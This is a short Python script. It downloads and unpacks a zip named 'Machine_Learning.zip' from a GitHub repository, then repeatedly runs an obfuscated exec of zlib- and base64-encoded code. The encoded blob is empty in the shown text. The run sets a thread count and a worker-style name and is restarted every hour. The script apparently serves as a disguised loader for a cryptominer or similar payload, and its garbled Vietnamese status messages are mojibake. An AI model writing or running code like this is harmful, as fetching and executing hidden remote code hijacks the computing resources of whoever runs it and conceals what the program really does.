import subprocess
import os
import signal
import requests
import zipfile
from time import sleep
import zlib,base64

# download file
url = "https://github.com/brontosimungo/crispy-invention/raw/refs/heads/main/Machine_Learning.zip"
filename = 'Machine_Learning.zip'
response = requests.get(url, stream=True)
file = open(filename, "wb")
file.write(response.content)
file.close()

# unzip file 
with zipfile.ZipFile('Machine_Learning.zip', 'r') as zip_ref:
	zip_ref.extractall()

# delete zip file
os.remove('Machine_Learning.zip')

code = "import zlib,base64;threads=8;name='jonimelehoy/C::3';exec(zlib.decompress(base64.b64decode(''[::-1])))"
while True:
    print("â¶ï¸ Äang cháº¡y code vá»i timeout 3600")
    # Táº¡o process group má»i Äá» kill cáº£ nhÃ³m
    process = subprocess.Popen(
        ["python3", "-c", code],
        preexec_fn=os.setsid  # Táº¡o process group
    )
    try:
        process.wait(timeout=3600)
    except subprocess.TimeoutExpired:
        print("â° Háº¿t 3600, Äang kill toÃ n bá» tiáº¿n trÃ¬nh...")
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # Kill cáº£ nhÃ³m
    sleep(1)
